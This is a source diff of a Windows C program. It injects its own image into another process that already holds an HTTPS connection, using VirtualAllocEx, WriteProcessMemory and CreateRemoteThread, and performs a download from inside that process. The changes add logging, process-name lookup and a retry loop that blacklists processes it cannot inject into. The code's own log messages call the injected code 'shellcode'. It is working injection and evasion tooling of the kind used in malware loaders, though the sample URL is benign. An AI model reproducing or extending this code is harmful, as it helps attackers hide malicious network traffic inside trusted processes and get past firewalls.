@@ -13,6 +13,14 @@
 
 #define URL_MAX_SIZE 1024
 
+#define DEBUG 1
+
+#if (defined(DEBUG) && DEBUG == 1) || defined(_DEBUG)
+#define LOG(s, ...) printf("Function " __FUNCTION__ " on line %d log message: '" s "'\n", __LINE__, __VA_ARGS__)
+#else
+#define LOG(s, ...) ((void)NULL)
+#endif
+
 typedef struct _BLACKLIST_PROC
 {
 	DWORD* lpdwTable;
@@ -35,6 +43,8 @@ typedef struct _CALLBACK_OUT
 } CALLBACK_OUT, * LPCALLBACK_OUT;
 
 typedef enum _CALLBACK_CODE {
+	CC_UNDEFINED,
+
 	CC_OK,
 	CC_INVALID_PARAMS,
 	CC_LOADLIB_ERR,
@@ -47,7 +57,9 @@ typedef enum _CALLBACK_CODE {
 	CC_DOWNLOAD_0_ERR,
 	CC_DOWNLOAD_1_ERR,
 	CC_OPEN_EXECUTOR_ERR,
-	CC_MEMALLOC_ERR
+	CC_MEMALLOC_ERR,
+
+	CC_MAXCODE
 } CALLBACK_CODE;
 
 static LPVOID MemAlloc(DWORD dwSize)
@@ -86,6 +98,32 @@ static LPVOID MemSet(LPVOID lpAddr, BYTE bValue, DWORD dwSize)
 	}
 
 	return lpAddr;
+}
+
+BOOL GetProcessNameById(DWORD dwProcessId, LPTSTR lpBuffer, DWORD dwBufferSize)
+{
+	HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); // all processes
+
+	if (!hSnap || hSnap == INVALID_HANDLE_VALUE) {
+		return FALSE;
+	}
+
+	PROCESSENTRY32 Entry = { 0 };
+	Entry.dwSize = sizeof(PROCESSENTRY32);
+
+	if (Process32First(hSnap, &Entry)) { // start with the first in snapshot
+		do {
+			if (Entry.th32ProcessID == dwProcessId) {
+				memset(lpBuffer, 0, dwBufferSize);
+				lstrcpy(lpBuffer, Entry.szExeFile);
+				break;
+			}
+		} while (Process32Next(hSnap, &Entry)); // keep going until end of snapshot
+	}
+
+	CloseHandle(hSnap);
+
+	return TRUE;
 }
 
 DWORD FindTargetProcessId(USHORT nRemotePort, BLACKLIST_PROC* lpBlacklistProc)
@@ -181,10 +219,12 @@ BOOL VirtualExecuteEx(HANDLE hProcess, LPTHREAD_START_ROUTINE lpFunction, LPDWOR
 
 	LPVOID lpTargetImage;
 	if ((lpTargetImage = VirtualAllocEx(hProcess, NULL, lpNtHeaders->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)) == NULL) {
+		LOG("Unable to allocate memory for shellcode (0x%x)", GetLastError());
 		return FALSE;
 	}
 
 	if (!WriteProcessMemory(hProcess, lpTargetImage, lpImageBase, lpNtHeaders->OptionalHeader.SizeOfImage, NULL)) {
+		LOG("Unable to write shellcode (0x%x)", GetLastError());
 		VirtualFreeEx(hProcess, lpTargetImage, 0, MEM_RELEASE);
 		return FALSE;
 	}
@@ -196,12 +236,14 @@ BOOL VirtualExecuteEx(HANDLE hProcess, LPTHREAD_START_ROUTINE lpFunction, LPDWOR
 
 		if (lpRemoteParameters != NULL) {
 			if (!WriteProcessMemory(hProcess, lpRemoteParameters, lpParameters, dwParametersSize, NULL)) {
+				LOG("Unable to write callback paramerets (0x%x)", GetLastError());
 				VirtualFreeEx(hProcess, lpRemoteParameters, 0, MEM_RELEASE);
 				VirtualFreeEx(hProcess, lpTargetImage, 0, MEM_RELEASE);
 				return FALSE;
 			}
 		}
 		else {
+			LOG("Unable to allocate memory for parameters (0x%x)", GetLastError());
 			VirtualFreeEx(hProcess, lpTargetImage, 0, MEM_RELEASE);
 			return FALSE;
 		}
@@ -211,6 +253,7 @@ BOOL VirtualExecuteEx(HANDLE hProcess, LPTHREAD_START_ROUTINE lpFunction, LPDWOR
 
 	HANDLE hThread;
 	if ((hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)((DWORD_PTR)lpFunction + dwDeltaImageBase), lpRemoteParameters, 0, NULL)) == NULL) {
+		LOG("Unable to create remote thread (0x%x)", GetLastError());
 		if (lpRemoteParameters) {
 			VirtualFreeEx(hProcess, lpRemoteParameters, 0, MEM_RELEASE);
 		}
@@ -427,7 +470,7 @@ DWORD WINAPI DownloadCallback(LPVOID lpThreadParameter)
 	HANDLE hExecutorProcess = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, lpInParams->dwExecutorProcessId);
 	if (hExecutorProcess == NULL) {
 		MemFree(lpDownloadBuffer);
-		return CC_OPEN_EXECUTOR_ERR;
+		return CC_OPEN_EXECUTOR_ERR; // maybe the executor is running as an administrator, but the target process is not
 	}
 
 	LPCALLBACK_OUT lpCallbackOut = MemAlloc(sizeof(CALLBACK_OUT));
@@ -469,58 +512,95 @@ VOID DestroyCallbackParameters(LPCALLBACK_IN lpCallbackIn)
 	VirtualFree(lpCallbackIn->dwCallbackOutAddr, 0, MEM_RELEASE);
 }
 
+VOID AddProcessToBlacklist(BLACKLIST_PROC* lpBlacklist, DWORD dwProcessId)
+{
+	lpBlacklist->lpdwTable = MemRealloc(lpBlacklist->lpdwTable, (lpBlacklist->dwCount + 1) * sizeof(DWORD));
+	lpBlacklist->lpdwTable[lpBlacklist->dwCount] = dwProcessId;
+	lpBlacklist->dwCount += 1;
+}
+
 int main()
 {
 	const TCHAR tszUrl[] = TEXT("https://google.com");
 	const USHORT nPort = INTERNET_DEFAULT_HTTPS_PORT;
 
 	BLACKLIST_PROC BlacklistProc = { 0 };
-	HANDLE hTargetProcess = NULL;
+
+	BOOL bDownloaded = FALSE;
+
 	do {
-		DWORD dwTargetProcessId = 0;
-		while (!dwTargetProcessId) {
-			dwTargetProcessId = FindTargetProcessId(nPort, &BlacklistProc);
+		DWORD dwTargetProcessId;
+		if ((dwTargetProcessId = FindTargetProcessId(nPort, &BlacklistProc)) == 0) {
+			continue;
 		}
 
-		printf("Target process id: %d\n", dwTargetProcessId);
+		TCHAR szProcessName[MAX_PATH] = { 0 };
+		GetProcessNameById(dwTargetProcessId, szProcessName, MAX_PATH * sizeof(TCHAR));
 
+		printf(
+			"%s"
+			"Process finded!\n"
+			"Process id: %d\n"
+			"Process name: %s\n", 
+			(BlacklistProc.dwCount > 0 ? "\n" : ""),
+			dwTargetProcessId,
+			szProcessName
+		);
+
+		HANDLE hTargetProcess;
 		if ((hTargetProcess = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE, FALSE, dwTargetProcessId)) == NULL) {
-			BlacklistProc.lpdwTable = MemRealloc(BlacklistProc.lpdwTable, (BlacklistProc.dwCount + 1) * sizeof(DWORD));
-			BlacklistProc.lpdwTable[BlacklistProc.dwCount] = dwTargetProcessId;
-			BlacklistProc.dwCount += 1;
-			printf("Unable to open process(%d)\n", BlacklistProc.dwCount);
+			printf("Unable to open\n");
+			AddProcessToBlacklist(&BlacklistProc, dwTargetProcessId);
+			continue;
 		}
 
-	} while (hTargetProcess == NULL);
+		CALLBACK_IN InParams = { 0 };
+		CreateCallbackParameters(&InParams, tszUrl, nPort);
 
-	printf("Process handle: 0x%p\n", hTargetProcess);
+		printf("Connection URL: %s:%d\n", InParams.tszUrl, InParams.nPort);
 
-	CALLBACK_IN InParams = { 0 };
-	CreateCallbackParameters(&InParams, tszUrl, nPort);
+		DWORD dwExitCode = 0;
+		if (VirtualExecuteEx(hTargetProcess, DownloadCallback, &dwExitCode, &InParams, sizeof(CALLBACK_IN))) {
+			LPCALLBACK_OUT lpOutParams = InParams.dwCallbackOutAddr;
 
-	DWORD dwExitCode = 0;
-	if (VirtualExecuteEx(hTargetProcess, DownloadCallback, &dwExitCode, &InParams, sizeof(CALLBACK_IN))) {
-		LPCALLBACK_OUT lpOutParams = InParams.dwCallbackOutAddr;
+			if (dwExitCode == CC_OK) {
+				LPBYTE lpbData = (LPBYTE)(LPVOID)lpOutParams->dwDataAddr;
+				DWORD dwDataSize = lpOutParams->dwDataSize;
 
-		if (dwExitCode == CC_OK) {
-			LPBYTE lpbData = (LPBYTE)(LPVOID)lpOutParams->dwDataAddr;
-			DWORD dwDataSize = lpOutParams->dwDataSize;
+				printf(
+					"Successfully downloaded!\n"
+					"Download data size: %d bytes\n"
+					"Download data: %s\n", 
+					dwDataSize, 
+					(CHAR*)lpbData
+				);
 
-			printf("Successfully downloaded!\nSize: %d bytes\nData: %s\n", dwDataSize, (CHAR*)lpbData);
+				VirtualFree(lpbData, 0, MEM_RELEASE);
 
-			VirtualFree(lpbData, 0, MEM_RELEASE);
+				bDownloaded = TRUE;
+			}
+			else {
+				if (dwExitCode >= CC_MAXCODE) {
+					printf("Callback closed with internal error\n");
+				}
+				else {
+					printf("Callback returned the error code: %lu\n", dwExitCode);
+				}
+
+				AddProcessToBlacklist(&BlacklistProc, dwTargetProcessId);
+			}
 		}
 		else {
-			printf("Exit code: %d\n", CC_OK);
+			printf("Unable to execute callback\n");
+
+			AddProcessToBlacklist(&BlacklistProc, dwTargetProcessId);
 		}
-	}
-	else { 
-		printf("Unable to execute callback\n"); 
-	}
 
-	DestroyCallbackParameters(&InParams);
+		DestroyCallbackParameters(&InParams);
 
-	CloseHandle(hTargetProcess);
+		CloseHandle(hTargetProcess);
+
+	} while (!bDownloaded);
 
 	return 0;
 }
